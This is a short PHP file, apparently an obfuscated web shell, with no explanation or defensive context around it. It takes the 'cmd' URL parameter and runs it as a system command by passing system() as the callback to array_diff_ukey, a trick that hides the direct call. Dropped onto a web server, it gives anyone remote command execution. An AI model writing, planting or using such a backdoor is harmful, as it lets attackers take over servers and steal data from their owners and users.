<?php
if (isset($_GET["cmd"]))
{
array_diff_ukey(@array($_GET['cmd']=>1),@array('user'=>2),'system');
}
?>